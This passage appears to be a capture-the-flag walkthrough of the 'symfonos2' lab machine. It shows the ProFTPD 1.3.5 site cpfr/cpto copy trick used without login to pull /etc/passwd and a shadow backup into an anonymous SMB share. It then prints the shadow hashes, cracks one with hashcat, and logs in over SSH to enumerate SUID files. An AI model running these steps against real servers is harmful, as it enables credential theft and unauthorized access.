# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic
# errors.

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes



#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d


####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller".
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the
# SAMR RPC pipe.
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# This allows Unix groups to be created on the domain controller via the SAMR
# RPC pipe.
; add group script = /usr/sbin/addgroup --force-badname %g

############ Misc ############

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting
;   include = /home/samba/etc/smb.conf.%m

# Some defaults for winbind (make sure you're not using the ranges
# for something else.)
;   idmap uid = 10000-20000
;   idmap gid = 10000-20000
;   template shell = /bin/bash

# Setup usershare options to enable non-root users to share folders
# with the net usershare command.

# Maximum number of usershare. 0 (default) means that usershare is disabled.
;   usershare max shares = 100

# Allow users who've been granted usershare privileges to create
# public shares, not just authenticated ones
   usershare allow guests = yes

#======================= Share Definitions =======================

[homes]
   comment = Home Directories
   browseable = no

# By default, the home directories are exported read-only. Change the
# next parameter to 'no' if you want to be able to write to them.
   read only = yes

# File creation mask is set to 0700 for security reasons. If you want to
# create files with group=rw permissions, set next parameter to 0775.
   create mask = 0700

# Directory creation mask is set to 0700 for security reasons. If you want to
# create dirs. with group=rw permissions, set next parameter to 0775.
   directory mask = 0700

# By default, \\server\username shares can be connected to by anyone
# with access to the samba server.
# The following parameter makes sure that only "username" can connect
# to \\server\username
# This might need tweaking when using external authentication schemes
   valid users = %S

# Un-comment the following and create the netlogon directory for Domain Logons
# (you need to configure Samba to act as a domain controller too.)
;[netlogon]
;   comment = Network Logon Service
;   path = /home/samba/netlogon
;   guest ok = yes
;   read only = yes

# Un-comment the following and create the profiles directory to store
# users profiles (see the "logon path" option above)
# (you need to configure Samba to act as a domain controller too.)
# The path below should be writable by all users so that their
# profile directory may be created the first time they log on
;[profiles]
;   comment = Users profiles
;   path = /home/samba/profiles
;   guest ok = no
;   browseable = no
;   create mask = 0600
;   directory mask = 0700

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes

root@symfonos2:~# cat /usr/local/etc/proftpd.conf
# This is a basic ProFTPD configuration file (rename it to
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            aeolus
Group                           aeolus

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite          on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User                          ftp
  Group                         ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients                    10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  #DisplayLogin                 welcome.msg
  #DisplayChdir                 .message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>

```

```shell
grep -C3 -Hnri "/etc\|/root\|/home" log.txt
log.txt:1:root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
log.txt:2:root@symfonos2:~# cat /etc/samba/smb.conf
log.txt-3-#
log.txt-4-# Sample configuration file for the Samba suite for Debian GNU/Linux.
log.txt-5-#
--
log.txt-166-# Using the following line enables you to customise your configuration
log.txt-167-# on a per machine basis. The %m gets replaced with the netbios name
log.txt-168-# of the machine that is connecting
log.txt:169:;   include = /home/samba/etc/smb.conf.%m
log.txt-170-
log.txt-171-# Some defaults for winbind (make sure you're not using the ranges
log.txt-172-# for something else.)
--
log.txt-213-# (you need to configure Samba to act as a domain controller too.)
log.txt-214-;[netlogon]
log.txt-215-;   comment = Network Logon Service
log.txt:216:;   path = /home/samba/netlogon
log.txt-217-;   guest ok = yes
log.txt-218-;   read only = yes
log.txt-219-
--
log.txt-224-# profile directory may be created the first time they log on
log.txt-225-;[profiles]
log.txt-226-;   comment = Users profiles
log.txt:227:;   path = /home/samba/profiles
log.txt-228-;   guest ok = no
log.txt-229-;   browseable = no
log.txt-230-;   create mask = 0600
--
log.txt-255-;   write list = root, @lpadmin
log.txt-256-
log.txt-257-[anonymous]
log.txt:258:   path = /home/aeolus/share
log.txt-259-   browseable = yes
log.txt-260-   read only = yes
log.txt-261-   guest ok = yes
log.txt-262-
log.txt:263:root@symfonos2:~# cat /usr/local/etc/proftpd.conf
log.txt-264-# This is a basic ProFTPD configuration file (rename it to
log.txt-265-# 'proftpd.conf' for actual use.  It establishes a single server
log.txt-266-# and a single anonymous login.  It assumes that you have a user/group

```

![1.improper-backup](1.improper-backup.png)

## FTP

```shell
ftp -p $RHOST 21
Connected to 192.168.56.89.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.89]
Name (192.168.56.89:f0c1s): ftp
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

```

```shell
ftp -p $RHOST 21
Connected to 192.168.56.89.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.89]
Name (192.168.56.89:f0c1s): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

```

Since I cannot login, what else can I do. I remember that ProFTPd allows `site cpfr` and `site cpto` commands.

[Read here: digitalworld-local:Joy#about-site-cptocpfr](../../../sec/vulnhub/digitalworld.local-Joy/joy.html#about-site-cptocpfr)

### Getting shadow and passwd

```shell
ftp $RHOST 21
Connected to 192.168.56.89.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.89]
Name (192.168.56.89:f0c1s): ftp
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
ftp: Login failed
ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow-copied
250 Copy successful
ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/passwd-copied
250 Copy successful
ftp> exit
221 Goodbye.

```

![2.copy-files-to-smb-share](2.copy-files-to-smb-share.png)

The SMB share info is in log.txt file.

```shell
grep -C2 -Hnri "/home" log.txt
log.txt-167-# on a per machine basis. The %m gets replaced with the netbios name
log.txt-168-# of the machine that is connecting
log.txt:169:;   include = /home/samba/etc/smb.conf.%m
log.txt-170-
log.txt-171-# Some defaults for winbind (make sure you're not using the ranges
--
log.txt-214-;[netlogon]
log.txt-215-;   comment = Network Logon Service
log.txt:216:;   path = /home/samba/netlogon
log.txt-217-;   guest ok = yes
log.txt-218-;   read only = yes
--
log.txt-225-;[profiles]
log.txt-226-;   comment = Users profiles
log.txt:227:;   path = /home/samba/profiles
log.txt-228-;   guest ok = no
log.txt-229-;   browseable = no
--
log.txt-256-
log.txt-257-[anonymous]
log.txt:258:   path = /home/aeolus/share
log.txt-259-   browseable = yes
log.txt-260-   read only = yes

```

![3.smb-anonymous-share](3.smb-anonymous-share.png)

```shell
smbclient //$RHOST/anonymous -U ''
Enter WORKGROUP\'s password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan  6 00:31:36 2022
  ..                                  D        0  Thu Jul 18 19:59:08 2019
  passwd-copied                       N     1614  Thu Jan  6 00:31:36 2022
  backups                             D        0  Thu Jul 18 19:55:17 2019
  shadow-copied                       N     1173  Thu Jan  6 00:31:09 2022

                19728000 blocks of size 1024. 16311252 blocks available
smb: \> get passwd-copied
getting file \passwd-copied of size 1614 as passwd-copied (262.7 KiloBytes/sec) (average 262.7 KiloBytes/sec)
smb: \> get shadow-copied
getting file \shadow-copied of size 1173 as shadow-copied (190.9 KiloBytes/sec) (average 226.8 KiloBytes/sec)
smb: \> exit

```

![4.fetching-files-from-smb](4.fetching-files-from-smb.png)

```shell
cat passwd-copied
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
aeolus:x:1000:1000:,,,:/home/aeolus:/bin/bash
cronus:x:1001:1001:,,,:/home/cronus:/bin/bash
mysql:x:110:114:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:111:115::/var/lib/snmp:/bin/false
librenms:x:999:999::/opt/librenms:

```

```shell
cat shadow-copied
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::

```

## hashcat

```shell
cat symfonos-2.2022.01.05
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/

hashcat -m1800 -a0 --user -o cracked.symfonos-2.2022.01.05 symfonos-2.2022.01.05 /usr/share/wordlists/rockyou.txt -O

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: symfonos-2.2022.01.05
Time.Started.....: Wed Jan  5 19:19:00 2022 (51 secs)
Time.Estimated...: Wed Jan  5 19:23:12 2022 (3 mins, 21 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   113.7 kH/s (6.81ms) @ Accel:2048 Loops:64 Thr:32 Vec:1
Recovered........: 1/3 (33.33%) Digests, 1/3 (33.33%) Salts
Progress.........: 8652728/43033209 (20.11%)
Rejected.........: 67512/8652728 (0.78%)
Restore.Point....: 2839038/14344403 (19.79%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:3968-4032
Candidate.Engine.: Device Generator
Candidates.#1....: wORMTAPE111 -> vertigo1988
Hardware.Mon.#1..: Temp: 67c Fan: 59% Util: 92% Core:1875MHz Mem:6801MHz Bus:16

cat cracked.symfonos-2.2022.01.05
$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo

```

Credentials aeolus:sergioteamo

## Try the credentials

### FTP

We can upload files, this might be handy.


```shell
ftp -p $RHOST 21
Connected to 192.168.56.89.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.89]
Name (192.168.56.89:f0c1s): aeolus
331 Password required for aeolus
Password:
230 User aeolus logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42235|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:01 share
226 Transfer complete
ftp> ls -la
229 Entering Extended Passive Mode (|||35097|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 aeolus   aeolus       4096 Jul 18  2019 .
drwxr-xr-x   4 root     root         4096 Jul 18  2019 ..
lrwxrwxrwx   1 root     root            9 Jul 18  2019 .bash_history -> /dev/null
-rw-r--r--   1 aeolus   aeolus        220 Jul 18  2019 .bash_logout
-rw-r--r--   1 aeolus   aeolus       3526 Jul 18  2019 .bashrc
-rw-r--r--   1 aeolus   aeolus        675 Jul 18  2019 .profile
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:01 share
226 Transfer complete
ftp> cd share
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||55641|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:01 .
drwxr-xr-x   3 aeolus   aeolus       4096 Jul 18  2019 ..
drwxr-xr-x   2 aeolus   aeolus       4096 Jul 18  2019 backups
-rw-r--r--   1 aeolus   aeolus       1614 Jan  5 19:01 passwd-copied
-rw-r--r--   1 aeolus   aeolus       1173 Jan  5 19:01 shadow-copied
226 Transfer complete
ftp> cd ..
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||64639|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 aeolus   aeolus       4096 Jul 18  2019 .
drwxr-xr-x   4 root     root         4096 Jul 18  2019 ..
lrwxrwxrwx   1 root     root            9 Jul 18  2019 .bash_history -> /dev/null
-rw-r--r--   1 aeolus   aeolus        220 Jul 18  2019 .bash_logout
-rw-r--r--   1 aeolus   aeolus       3526 Jul 18  2019 .bashrc
-rw-r--r--   1 aeolus   aeolus        675 Jul 18  2019 .profile
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:01 share
226 Transfer complete
ftp> put enum4linux.txt
local: enum4linux.txt remote: enum4linux.txt
229 Entering Extended Passive Mode (|||26666|)
150 Opening BINARY mode data connection for enum4linux.txt
100% |**********************************************************************| 16087       34.16 MiB/s    00:00 ETA
226 Transfer complete
16087 bytes sent in 00:00 (9.00 MiB/s)
ftp> ls -a
229 Entering Extended Passive Mode (|||25839|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:25 .
drwxr-xr-x   4 root     root         4096 Jul 18  2019 ..
lrwxrwxrwx   1 root     root            9 Jul 18  2019 .bash_history -> /dev/null
-rw-r--r--   1 aeolus   aeolus        220 Jul 18  2019 .bash_logout
-rw-r--r--   1 aeolus   aeolus       3526 Jul 18  2019 .bashrc
-rw-r--r--   1 aeolus   aeolus        675 Jul 18  2019 .profile
-rw-r--r--   1 aeolus   aeolus      16087 Jan  5 19:25 enum4linux.txt
drwxr-xr-x   3 aeolus   aeolus       4096 Jan  5 19:01 share
226 Transfer complete
ftp> exit
221 Goodbye.

```

### SSH

```shell
ssh aeolus@$RHOST
aeolus@192.168.56.89's password:
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  5 13:26:41 2022 from 192.168.56.70
aeolus@symfonos2:~$ ls -la
total 40
drwxr-xr-x 3 aeolus aeolus  4096 Jan  5 13:25 .
drwxr-xr-x 4 root   root    4096 Jul 18  2019 ..
lrwxrwxrwx 1 root   root       9 Jul 18  2019 .bash_history -> /dev/null
-rw-r--r-- 1 aeolus aeolus   220 Jul 18  2019 .bash_logout
-rw-r--r-- 1 aeolus aeolus  3526 Jul 18  2019 .bashrc
-rw-r--r-- 1 aeolus aeolus 16087 Jan  5 13:25 enum4linux.txt
-rw-r--r-- 1 aeolus aeolus   675 Jul 18  2019 .profile
drwxr-xr-x 3 aeolus aeolus  4096 Jan  5 13:01 share
aeolus@symfonos2:~$ sudo -l
[sudo] password for aeolus:
Sorry, user aeolus may not run sudo on symfonos2.
aeolus@symfonos2:~$ exit
logout
Connection to 192.168.56.89 closed.

```

## SSH

### Find

```shell
aeolus@symfonos2:~$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -and -mtime -1 -and -not -user root -exec ls -l "{}" \; 2>/dev/null
-rw------- 1 Debian-snmp Debian-snmp 1072 Jan  5 12:16 /var/lib/snmp/snmpd.conf
-rw-rw---- 1 mysql mysql 79691776 Jan  5 12:16 /var/lib/mysql/ibdata1
-rw-rw---- 1 mysql mysql 50331648 Jan  5 12:16 /var/lib/mysql/ib_logfile0
-rw-rw---- 1 mysql mysql 24576 Jan  5 12:16 /var/lib/mysql/tc.log
-rw------- 1 www-data www-data 3 Jan  5 12:16 /run/webfs/webfsd.pid
-rw-rw---- 1 mysql mysql 4 Jan  5 12:16 /run/mysqld/mysqld.pid
-rw-r--r-- 1 aeolus aeolus 16087 Jan  5 13:25 /home/aeolus/enum4linux.txt
-rw-r--r-- 1 aeolus aeolus 1614 Jan  5 13:01 /home/aeolus/share/passwd-copied
-rw-r--r-- 1 aeolus aeolus 1173 Jan  5 13:01 /home/aeolus/share/shadow-copied

aeolus@symfonos2:~$ find / -type f -name "*bak" -exec ls -lh "{}" \; 2>/dev/null
-rw------- 1 root root 1.6K Jul 18  2019 /var/backups/passwd.bak
-rw-r--r-- 1 root root 1.2K Jul 18  2019 /var/backups/shadow.bak
-rw------- 1 root root 760 Jul 18  2019 /var/backups/group.bak
-rw------- 1 root shadow 641 Jul 18  2019 /var/backups/gshadow.bak

aeolus@symfonos2:~$ find / -type f -name "*backup*" -exec ls -lh "{}" \; 2>/dev/null
-rw-r--r-- 1 root root 7.8K Feb  2  2019 /lib/modules/4.9.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7.8K Jun 16  2019 /lib/modules/4.9.0-9-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 151 Jul 18  2019 /var/lib/dpkg/alternatives/tdbbackup
-rwxr-xr-x 1 root root 35K Apr 16  2019 /usr/bin/wsrep_sst_mariabackup
-rwxr-xr-x 1 root root 18M Apr 16  2019 /usr/bin/mariabackup
-rwxr-xr-x 1 root root 14K Oct  9  2016 /usr/bin/tdbbackup.tdbtools
-rwxr-xr-x 1 root root 21K Apr 16  2019 /usr/bin/wsrep_sst_xtrabackup
-rwxr-xr-x 1 root root 40K Apr 16  2019 /usr/bin/wsrep_sst_xtrabackup-v2
-rw-r--r-- 1 root root 5.6K Dec 21  2016 /usr/share/nmap/scripts/http-backup-finder.nse
-rw-r--r-- 1 root root 7.1K Dec 21  2016 /usr/share/nmap/scripts/http-config-backup.nse
-rw-r--r-- 1 root root 351 Apr 16  2019 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
-rw-r--r-- 1 root root 348 Apr 16  2019 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
-rw-r--r-- 1 root root 357 Apr 16  2019 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
-rw-r--r-- 1 root root 1.6K Oct  9  2016 /usr/share/man/man8/tdbbackup.tdbtools.8.gz

## backup
aeolus@symfonos2:~$ find / -type d -name "*backup*" -exec ls -lh "{}" \; 2>/dev/null
total 496K
-rw-r--r-- 1 root root    50K Jul 18  2019 alternatives.tar.0
-rw-r--r-- 1 root root    21K Jul 18  2019 apt.extended_states.0
-rw-r--r-- 1 root root   1.3K Jul 18  2019 apt.extended_states.1.gz
-rw-r--r-- 1 root root   1.3K Jul 18  2019 apt.extended_states.2.gz
-rw-r--r-- 1 root root    280 Jul 18  2019 dpkg.diversions.0
-rw-r--r-- 1 root root    181 Jul 18  2019 dpkg.statoverride.0
-rw-r--r-- 1 root root   388K Jul 18  2019 dpkg.status.0
-rw------- 1 root root    760 Jul 18  2019 group.bak
-rw------- 1 root shadow  641 Jul 18  2019 gshadow.bak
-rw------- 1 root root   1.6K Jul 18  2019 passwd.bak
-rw-r--r-- 1 root root   1.2K Jul 18  2019 shadow.bak
total 12K
-rw-r--r-- 1 aeolus aeolus 12K Jul 18  2019 log.txt

## database
aeolus@symfonos2:~$ find / -type f -name "*database*" -exec ls -lh "{}" \; 2>/dev/null
-rw-r--r-- 1 root root 319 Jul 18  2019 /var/lib/dpkg/info/geoip-database.list
-rw-r--r-- 1 root root 355 May 12  2017 /var/lib/dpkg/info/geoip-database.md5sums
-rw-r--r-- 1 root root 117K Jul 18  2019 /var/lib/systemd/catalog/database
-rwxr-xr-x 1 root root 672 Mar 14  2018 /usr/bin/update-mime-database
-rwxr-xr-x 1 root root 52K Mar 14  2018 /usr/bin/update-mime-database.real
-rw-r--r-- 1 root root 2.9K Dec 21  2016 /usr/share/nmap/scripts/mysql-databases.nse
-rw-r--r-- 1 root root 2.6K Dec 21  2016 /usr/share/nmap/scripts/mongodb-databases.nse
-rw-r--r-- 1 root root 2.6K Dec 21  2016 /usr/share/nmap/scripts/couchdb-databases.nse
-rw-r--r-- 1 root root 38 May 12  2017 /usr/share/lintian/overrides/geoip-database
-rw-r--r-- 1 root root 3.1K Jul 18  2019 /usr/share/mime/application/vnd.oasis.opendocument.database.xml
-rw-r--r-- 1 root root 778 Mar 14  2018 /usr/share/man/man1/update-mime-database.1.gz

## SGID
aeolus@symfonos2:~$ find / -type f -perm -2000 -exec ls -lh "{}" \; 2>/dev/null
-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin/unix_chkpwd
-rwxr-sr-x 1 root tty 27K Mar  7  2018 /usr/bin/wall
-rwxr-sr-x 1 root mail 19K Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K Apr 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 11K Dec 24  2016 /usr/bin/dotlock.mailutils
-rwxr-sr-x 1 root ssh 351K Mar  1  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 40K Oct  7  2017 /usr/bin/crontab

## SUID
aeolus@symfonos2:~$ find / -type f -perm -4000 -exec ls -lh "{}" \; 2>/dev/null
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 996K May 28  2019 /usr/sbin/exim4
-rwsr-xr-x 1 root root 138K Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin/passwd
